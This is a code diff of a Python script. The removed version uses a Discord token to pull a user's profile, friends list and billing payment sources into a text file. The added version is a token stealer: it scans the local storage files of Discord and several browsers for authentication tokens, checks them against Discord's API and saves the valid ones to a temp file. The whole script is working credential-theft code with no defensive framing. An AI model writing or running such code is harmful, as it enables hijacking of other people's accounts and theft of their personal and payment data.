@@ -1,71 +1,76 @@
 import os
-import requests
+import re
+import json
 import tempfile
+import requests
 
-url1 = 'https://discord.com/api/v9/users/@me'
-url2 = 'https://discord.com/api/v9/users/@me/relationships'
-url3 = 'https://discord.com/api/users/@me/billing/payment-sources'
+def is_valid_token(token):
+    headers = {
+        'Authorization': token
+    }
+    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
+    return response.status_code == 200
 
-temp_folder = tempfile.gettempdir()
-token_file = os.path.join(temp_folder, 'discord_token.txt')
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
 
-# Read the token from the file
-with open(token_file, 'r') as file:
-    # Skip the first two lines
-    file.readline()
-    file.readline()
-    # Read the token from the third line
-    token = file.readline().strip()
+    tokens = []
 
-headers = {
-    'Authorization': token
-}
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
 
-# Make the request to Discord API - endpoint 1
-response1 = requests.get(url1, headers=headers)
-response_data1 = response1.json()
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    if token not in tokens and is_valid_token(token):  # Check for duplicates and validate token
+                        tokens.append(token)
+    return tokens
 
-# Make the request to Discord API - endpoint 2
-response2 = requests.get(url2, headers=headers)
-response_data2 = response2.json()
+def main():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
 
-# Make the request to Discord API - endpoint 3
-response3 = requests.get(url3, headers=headers)
-response_data3 = response3.json()
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
 
-# Remove unwanted keys from user data
-keys_to_remove = ['flags', 'locale', 'avatar', 'banner', 'banner_color', 'accent_color', 'Type', 'Premium Type']
-for key in keys_to_remove:
-    response_data1.pop(key, None)
+    tokens = []
 
-# Replace underscores with spaces in key names and capitalize the first letter of each word (except "id")
-response_data1 = {key.replace('_', ' ').title() if key != 'id' else 'ID': value for key, value in response_data1.items()}
-response_data2 = [{key.replace('_', ' ').title() if key != 'id' else 'ID': value for key, value in item.items()} for item in response_data2]
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
 
-# Store the output in a text file
-output_file = 'output.txt'
-with open(output_file, 'w') as file:
-    # Write user data heading
-    file.write("User Data\n")
-    file.write("-----------------------\n")
-    for key, value in response_data1.items():
-        file.write(f"{key}: {value}\n")
-    file.write("\n")
-    
-    # Write friends heading
-    file.write("Friends\n")
-    file.write("-----------------------\n")
-    for item in response_data2:
-        for key, value in item.items():
-            file.write(f"{key}: {value}\n")
-        file.write("\n")
+        tokens.extend(find_tokens(path))
 
-    # Write billing info heading
-    file.write("Billing Info\n")
-    file.write("-----------------------\n")
-    for item in response_data3:
-        for key, value in item.items():
-            file.write(f"{key}: {value}\n")
-        file.write("\n")
+    tokens = list(set(tokens))  # Remove duplicates
 
-print(f"Output saved to {output_file}")
+    valid_tokens = []
+
+    for token in tokens:
+        if is_valid_token(token):
+            valid_tokens.append(token)
+
+    output = ''
+    if len(valid_tokens) > 0:
+        output += 'Discord Tokens:\n```\n'
+        for token in valid_tokens:
+            output += f'{token}\n'
+        output += '```'
+    else:
+        output += 'No valid tokens found.'
+
+    temp_folder = tempfile.gettempdir()
+    output_file = os.path.join(temp_folder, 'discord_token.txt')
+
+    with open(output_file, 'w') as file:
+        file.write(output)
+
+if __name__ == '__main__':
+    main()
